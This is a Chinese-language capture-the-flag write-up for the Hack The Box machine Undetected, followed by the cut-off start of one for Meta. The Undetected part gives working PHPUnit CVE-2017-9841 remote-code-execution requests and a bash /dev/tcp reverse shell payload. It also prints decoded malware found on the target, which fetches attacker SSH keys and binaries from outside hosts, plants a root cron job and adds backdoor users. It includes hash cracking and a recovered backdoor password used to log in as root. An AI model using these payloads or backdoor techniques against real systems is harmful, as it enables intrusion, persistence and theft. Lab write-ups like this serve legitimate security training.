https://github.com/sebastianbergmann/phpunit/compare/5.5...5.6.0 这边给出了一个更新时间，最后一次是在2016-10-25，那咱们看看PHPUnit在这个时间之后的漏洞就可以了 这边搜索后可以看到有一个CVE-2017-9841是符合我们的条件的 漏洞利用Exploithttp://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php https://www.cvedetails.com/cve/CVE-2017-9841/ https://github.com/vulhub/vulhub/blob/master/phpunit/CVE-2017-9841/README.zh-cn.md 根据上面对该漏洞的描述，在vendor&#x2F;phpunit&#x2F;phpunit&#x2F;src&#x2F;Util&#x2F;PHP&#x2F;eval-stdin.php处进行利用，咱们抓个包进行一次尝试 在下方加入然后放包执行 成功被执行了 现在咱们来想办法构造一下命令 GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1 Host: store.djewelry.htb Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Length: 24 &lt;?php system(&quot;whoami&quot;)?&gt; 成功执行命令，但是有点麻烦，用curl看看能不能成功吧 ┌──(root💀kali)-[~/Desktop] └─# curl http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php --data &quot;&lt;?php system(&#39;whoami&#39;)?&gt;&quot; www-data OK，成功执行命令，那么现在来构造poc回弹shell吧 Shell使用nc监听一个端口 nc -nvlp 4444 &lt;?php system(&#39;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.24/4444 0&gt;&amp;1&quot;&#39;)?&gt; 在burp里执行即可获得shell ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.24] from (UNKNOWN) [10.10.11.146] 56644 bash: cannot set terminal process group (865): Inappropriate ioctl for device bash: no job control in this shell www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; &lt;HP$ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ whoami&amp;&amp;id &lt;ore/vendor/phpunit/phpunit/src/Util/PHP$ whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) 成功拿到一个shell Ctrl+Z返回 stty raw -echo; fg export TERM=xterm stty rows 51 cols 237 修复一下shell 权限提升Userwww-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ grep &#39;bash&#39; /etc/passwd root:x:0:0:root:/root:/bin/bash steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash steven1:x:1000:1000:,,,:/home/steven:/bin/bash 咱们的提权目标就在steven和steven1这两个用户上了 www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ cd /home www-data@production:/home$ ls steven www-data@production:/home$ cd steven bash: cd: steven: Permission denied www-data@production:/home$ ls -la total 12 drwxr-xr-x 3 root root 4096 Feb 8 19:59 . drwxr-xr-x 19 root root 4096 Feb 8 19:59 .. drwxr-x--- 5 steven steven 4096 Feb 8 19:59 steven 没有权限进入steven用户目录，这里暂时没有思路了，跑一个Linpeas看看 linpeas跑出来的结果比较多，就不全贴出来了，其中看到一个 &#x2F;var&#x2F;backups&#x2F;info存在一个这个文件，并且还是www-data权限的，去看看 www-data@production:/var/backups$ ls -la total 72 drwxr-xr-x 2 root root 4096 Feb 24 23:49 . drwxr-xr-x 13 root root 4096 Feb 8 19:59 .. -rw-r--r-- 1 root root 34011 Feb 8 19:05 apt.extended_states.0 -r-x------ 1 www-data www-data 27296 May 14 2021 info www-data@production:/var/backups$ file info info: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc004db7476356e9ed477835e583c68f1d2493a, for GNU/Linux 3.2.0, not stripped 这是一个二进制文件，查看一下 776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b 在一大堆乱码中找到了这么一串十六进制字符 ┌──(root💀kali)-[~/Desktop] └─# echo &quot;776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b&quot; | xxd -r -p wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo &quot;* 3 * * * root /var/lib/.main&quot; &gt;&gt; /etc/crontab; awk -F&quot;:&quot; &#39;$7 == &quot;/bin/bash&quot; &amp;&amp; $3 &gt;= 1000 {system(&quot;echo &quot;$1&quot;1:\\$6\\$zS7ykHfFMg3aYht4\\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: &gt;&gt; /etc/shadow&quot;)}&#39; /etc/passwd; awk -F&quot;:&quot; &#39;$7 == &quot;/bin/bash&quot; &amp;&amp; $3 &gt;= 1000 {system(&quot;echo &quot;$1&quot; &quot;$3&quot; &quot;$6&quot; &quot;$7&quot; &gt; users.txt&quot;)}&#39; /etc/passwd; while read -r user group home shell _; do echo &quot;$user&quot;1&quot;:x:$group:$group:,,,:$home:$shell&quot; &gt;&gt; /etc/passwd; done &lt; users.txt; rm users.txt; 我们将它转为ASCII格式 提取出这么一串hash，然后稍微修改一下 $6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/ 然后再读取中知道了这一串应该是setven1的密码，去使用john爆破一下试试 ┌──(root💀kali)-[~/Desktop] └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 4 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status ihatehackers (?) 1g 0:00:00:55 DONE (2022-02-25 01:39) 0.01789g/s 1594p/s 1594c/s 1594C/s jojo95..halo03 Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed 得到了setven1的密码 username = steven1 password = ihatehackers 使用ssh进行连接 ┌──(root💀kali)-[~/Desktop] └─# ssh steven1@10.10.11.146 steven1@10.10.11.146&#39;s password: steven@production:~$ whoami&amp;&amp;id steven uid=1000(steven) gid=1000(steven) groups=1000(steven) 成功获得user权限 steven@production:~$ ls user.txt steven@production:~$ cat user.txt e27e4aba73ab8ba7421550905082163e 成功获得user权限的flag文件 Rootsudo -l提示失败，那就跑个linpeas.sh看看情况吧 [+] Mails (limit 50) 17793 4 -rw-rw---- 1 steven mail 966 Jul 25 2021 /var/mail/steven 17793 4 -rw-rw---- 1 steven mail 966 Jul 25 2021 /var/spool/mail/steven 看到两个关于邮件的信息，查看一下 steven@production:~$ cat /var/mail/steven From root@production Sun, 25 Jul 2021 10:31:12 GMT Return-Path: &lt;root@production&gt; Received: from production (localhost [127.0.0.1]) by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847 for &lt;steven@production&gt;; Sun, 25 Jul 2021 10:31:12 GMT Received: (from root@localhost) by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847; Sun, 25 Jul 2021 10:31:12 GMT Date: Sun, 25 Jul 2021 10:31:12 GMT Message-Id: &lt;202107251031.80FAcdZ171847@production&gt; To: steven@production From: root@production Subject: Investigations Hi Steven. We recently updated the system but are still experiencing some strange behaviour with the Apache service. We have temporarily moved the web store and database to another server whilst investigations are underway. If for any reason you need access to the database or web application code, get in touch with Mark and he will generate a temporary password for you to authenticate to the temporary server. Thanks, sysadmin 这里大概意思是说最近更新了一下系统，但是在apache上有点奇怪的问题，所以暂时把商城和数据库搬迁到另一台服务器上了，正在排查原因，如果我们需要访问的话可以联系Mark，他会给我们一个临时密码的 这里我猜测应该是做邮件伪造了 不过我们还是先去看看apache服务吧 apache服务目录位于&#x2F;usr&#x2F;lib steven@production:~$ ls -la /usr/lib/apache2/ total 28 drwxr-xr-x 3 root root 4096 Jul 5 2021 . drwxr-xr-x 82 root root 4096 Feb 8 19:59 .. drwxr-xr-x 2 root root 20480 Jan 28 21:05 modules 我们对这个目录有读取和执行权限，还不错，去看看 steven@production:/usr/lib/apache2/modules$ ls -la total 8796 drwxr-xr-x 2 root root 20480 Jan 28 21:05 . drwxr-xr-x 3 root root 4096 Jul 5 2021 .. -rw-r--r-- 1 root root 15925 Jan 5 14:49 httpd.exp -rw-r--r-- 1 root root 4625776 Nov 25 23:16 libphp7.4.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_access_compat.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_actions.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_alias.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_allowmethods.so -rw-r--r-- 1 root root 14464 Jan 5 14:49 mod_asis.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_auth_basic.so -rw-r--r-- 1 root root 39120 Jan 5 14:49 mod_auth_digest.so -rw-r--r-- 1 root root 35024 Jan 5 14:49 mod_auth_form.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_authn_anon.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_authn_core.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_authn_dbd.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_authn_dbm.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_authn_file.so -rw-r--r-- 1 root root 22768 Jan 5 14:49 mod_authn_socache.so -rw-r--r-- 1 root root 35024 Jan 5 14:49 mod_authnz_fcgi.so -rw-r--r-- 1 root root 55528 Jan 5 14:49 mod_authnz_ldap.so -rw-r--r-- 1 root root 30928 Jan 5 14:49 mod_authz_core.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_authz_dbd.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_authz_dbm.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_authz_groupfile.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_authz_host.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_authz_owner.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_authz_user.so -rw-r--r-- 1 root root 43216 Jan 5 14:49 mod_autoindex.so -rw-r--r-- 1 root root 22736 Jan 5 14:49 mod_brotli.so -rw-r--r-- 1 root root 14464 Jan 5 14:49 mod_bucketeer.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_buffer.so -rw-r--r-- 1 root root 80176 Jan 5 14:49 mod_cache.so -rw-r--r-- 1 root root 39120 Jan 5 14:49 mod_cache_disk.so -rw-r--r-- 1 root root 39152 Jan 5 14:49 mod_cache_socache.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_case_filter.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_case_filter_in.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_cern_meta.so -rw-r--r-- 1 root root 30928 Jan 5 14:49 mod_cgi.so -rw-r--r-- 1 root root 43216 Jan 5 14:49 mod_cgid.so -rw-r--r-- 1 root root 26832 Jan 5 14:49 mod_charset_lite.so -rw-r--r-- 1 root root 14464 Jan 5 14:49 mod_data.so -rw-r--r-- 1 root root 104656 Jan 5 14:49 mod_dav.so -rw-r--r-- 1 root root 59600 Jan 5 14:49 mod_dav_fs.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_dav_lock.so -rw-r--r-- 1 root root 26832 Jan 5 14:49 mod_dbd.so -rw-r--r-- 1 root root 39120 Jan 5 14:49 mod_deflate.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_dialup.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_dir.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_dumpio.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_echo.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_env.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_expires.so -rw-r--r-- 1 root root 26832 Jan 5 14:49 mod_ext_filter.so -rw-r--r-- 1 root root 14592 Jan 5 14:49 mod_file_cache.so -rw-r--r-- 1 root root 22736 Jan 5 14:49 mod_filter.so -rw-r--r-- 1 root root 30928 Jan 5 14:49 mod_headers.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_heartbeat.so -rw-r--r-- 1 root root 30928 Jan 5 14:49 mod_heartmonitor.so -rw-r--r-- 1 root root 253632 Jan 5 14:49 mod_http2.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_ident.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_imagemap.so -rw-r--r-- 1 root root 55504 Jan 5 14:49 mod_include.so -rw-r--r-- 1 root root 26832 Jan 5 14:49 mod_info.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_lbmethod_bybusyness.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_lbmethod_byrequests.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_lbmethod_bytraffic.so -rw-r--r-- 1 root root 22736 Jan 5 14:49 mod_lbmethod_heartbeat.so -rw-r--r-- 1 root root 84176 Jan 5 14:49 mod_ldap.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_log_debug.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_log_forensic.so -rw-r--r-- 1 root root 134544 Jan 5 14:49 mod_lua.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_macro.so -rw-r--r-- 1 root root 260672 Jan 5 14:49 mod_md.so -rw-r--r-- 1 root root 26832 Jan 5 14:49 mod_mime.so -rw-r--r-- 1 root root 30928 Jan 5 14:49 mod_mime_magic.so -rw-r--r-- 1 root root 67792 Jan 5 14:49 mod_mpm_event.so -rw-r--r-- 1 root root 39120 Jan 5 14:49 mod_mpm_prefork.so -rw-r--r-- 1 root root 47312 Jan 5 14:49 mod_mpm_worker.so -rw-r--r-- 1 root root 39120 Jan 5 14:49 mod_negotiation.so -rw-r--r-- 1 root root 133888 Jan 5 14:49 mod_proxy.so -rw-r--r-- 1 root root 55504 Jan 5 14:49 mod_proxy_ajp.so -rw-r--r-- 1 root root 59600 Jan 5 14:49 mod_proxy_balancer.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_proxy_connect.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_proxy_express.so -rw-r--r-- 1 root root 35024 Jan 5 14:49 mod_proxy_fcgi.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_proxy_fdpass.so -rw-r--r-- 1 root root 47312 Jan 5 14:49 mod_proxy_ftp.so -rw-r--r-- 1 root root 35024 Jan 5 14:49 mod_proxy_hcheck.so -rw-r--r-- 1 root root 39152 Jan 5 14:49 mod_proxy_html.so -rw-r--r-- 1 root root 47312 Jan 5 14:49 mod_proxy_http.so -rw-r--r-- 1 root root 67936 Jan 5 14:49 mod_proxy_http2.so -rw-r--r-- 1 root root 22768 Jan 5 14:49 mod_proxy_scgi.so -rw-r--r-- 1 root root 22656 Jan 5 14:49 mod_proxy_uwsgi.so -rw-r--r-- 1 root root 18560 Jan 5 14:49 mod_proxy_wstunnel.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_ratelimit.so -rw-r--r-- 1 root root 34800 May 17 2021 mod_reader.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_reflector.so -rw-r--r-- 1 root root 30928 Jan 5 14:49 mod_remoteip.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_reqtimeout.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_request.so -rw-r--r-- 1 root root 75984 Jan 5 14:49 mod_rewrite.so -rw-r--r-- 1 root root 43216 Jan 5 14:49 mod_sed.so -rw-r--r-- 1 root root 26832 Jan 5 14:49 mod_session.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_session_cookie.so -rw-r--r-- 1 root root 30928 Jan 5 14:49 mod_session_crypto.so -rw-r--r-- 1 root root 22736 Jan 5 14:49 mod_session_dbd.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_setenvif.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_slotmem_plain.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_slotmem_shm.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_socache_dbm.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_socache_memcache.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_socache_redis.so -rw-r--r-- 1 root root 26832 Jan 5 14:49 mod_socache_shmcb.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_speling.so -rw-r--r-- 1 root root 248240 Jan 5 14:49 mod_ssl.so -rw-r--r-- 1 root root 26832 Jan 5 14:49 mod_status.so -rw-r--r-- 1 root root 26832 Jan 5 14:49 mod_substitute.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_suexec.so -rw-r--r-- 1 root root 14464 Jan 5 14:49 mod_unique_id.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_userdir.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_usertrack.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_vhost_alias.so -rw-r--r-- 1 root root 26832 Jan 5 14:49 mod_xml2enc.so 文件有点多啊，那么稍微筛选一下，按照最近修改来排序 steven@production:/usr/lib/apache2/modules$ ls --full-time -i | sort -u 2050 -rw-r--r-- 1 root root 34800 2021-05-17 07:10:04.000000000 +0000 mod_reader.so 就是这个文件了，我们把它下载下来看看 scp steven1@10.10.11.146:/usr/lib/apache2/modules/mod_reader.so ~/Desktop 下载下来后，在mod_reader.so中提取到一段base64码 d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk 给解析一下 ┌──(root💀kali)-[~/Desktop] └─# echo -n &#39;d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk&#39; | base64 -d wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd 这边是把这张图片传输到sshd，去下载下来 使用ghidra打开进行逆向 从这里可以看出来，我们的密码是31位 backdoor._28_2_ = 0xa9f4; backdoor._24_4_ = 0xbcf0b5e3; backdoor._16_8_ = 0xb2d6f4a0fda0b3d6; backdoor[30] = -0x5b; backdoor._0_4_ = 0xf0e7abd6; backdoor._4_4_ = 0xa4b3a3f3; backdoor._8_4_ = 0xf7bbfdc8; backdoor._12_4_ = 0xfdb3d6e7; 我们给它排序一下，从高到低排序 backdoor[30] = -0x5b; backdoor._28_2_ = 0xa9f4; backdoor._24_4_ = 0xbcf0b5e3; backdoor._16_8_ = 0xb2d6f4a0fda0b3d6; backdoor._12_4_ = 0xfdb3d6e7; backdoor._8_4_ = 0xf7bbfdc8; backdoor._4_4_ = 0xa4b3a3f3; backdoor._0_4_ = 0xf0e7abd6; 0x5b 0xa9f4 0xbcf0b5e3 0xb2d6f4a0fda0b3d6 0xfdb3d6e7 0xf7bbfdc8 0xa4b3a3f3 0xf0e7abd6 这边排序好以后，右键查看一下0x5b 发现正确的应该是0xa5，修改一下后去做一下编码 首先转化成HEX再转化为XOR https://gchq.github.io/CyberChef/#recipe=Swap_endianness(‘Hex’,31,true)From_Hex(‘Auto’)XOR({‘option’:’Hex’,’string’:’96’},’Standard’,false)&amp;input&#x3D;MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg 这是最终改出来的效果，点开即可看到我的结果 0xa5 0xa9f4 0xbcf0b5e3 0xb2d6f4a0fda0b3d6 0xfdb3d6e7 0xf7bbfdc8 0xa4b3a3f3 0xf0e7abd6 @=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3 得到了backdoor的密码 ┌──(root💀kali)-[~/Desktop] └─# ssh root@10.10.11.146 The authenticity of host &#39;10.10.11.146 (10.10.11.146)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:2jPT4mThqEcnA/qjjQsIWwy2QNwGObWQX5MjK5YNvCM. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.11.146&#39; (ECDSA) to the list of known hosts. root@10.10.11.146&#39;s password: Last login: Fri Feb 25 12:56:49 2022 from 10.10.14.76 root@production:~# whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) 成功提权到root root@production:~# ls root.txt root@production:~# cat root.txt 4a243e1e3ccb05dbcd7a29abb49d3bcf 成功拿到root的flag文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Meta - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Meta","date":"2022-02-22T11:38:36.000Z","updated":"2023-06-13T03:46:40.000Z","comments":true,"path":"2022/02/22/Hackthebox/Medium/Hackthebox-Meta/","link":"","permalink":"http://www.lucifiel.com/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/","excerpt":"","text":"Hackthebox - Meta靶场信息 靶场类型 信息搜集Nmap首先使用nmap进行端口扫描 ┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.140 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-19 21:46 EST Nmap scan report for 10.10.11.140 Host is up (0.22s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA) | 256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA) |_ 256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519) 80/tcp open http Apache httpd |_http-server-header: Apache |_http-title: Did not follow redirect to http://artcorp.htb No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=2/19%OT=22%CT=1%CU=40520%PV=Y%DS=2%DC=T%G=Y%TM=6211ABB OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1 OS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 8888/tcp) HOP RTT ADDRESS 1 222.35 ms 10.10.14.1 2 222.43 ms 10.10.11.140 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 45.02 seconds Http进入80端口会自动跳转到artcorp.htb，先加入到hosts echo 10.10.11.140 artcorp.htb &gt;&gt; /etc/hosts 看样子是一家艺术公司，进来后没有什么有用的东西，先fuzz一下目录看看吧 Fuzz┌──(root💀kali)-[~/Desktop] └─# ffuf -u &quot;http://artcorp.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://artcorp.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ assets [Status: 301, Size: 234, Words: 14, Lines: 8] css [Status: 301, Size: 231, Words: 14, Lines: 8] server-status [Status: 403, Size: 199, Words: 14, Lines: 8] [Status: 200, Size: 4427, Words: 1663, Lines: 87] :: Progress: [20116/20116] :: Job [1/1] :: 180 req/sec :: Duration: [0:01:54] :: Errors: 0 :: 也没什么有用的东西，去fuzz一下子域名看看 ┌──(root💀kali)-[~/Desktop] └─# ffuf -c -u http://artcorp.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H &quot;Host: FUZZ.artcorp.htb&quot; -mc 200 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://artcorp.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.artcorp.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200 ________________________________________________ dev01 [Status: 200, Size: 247, 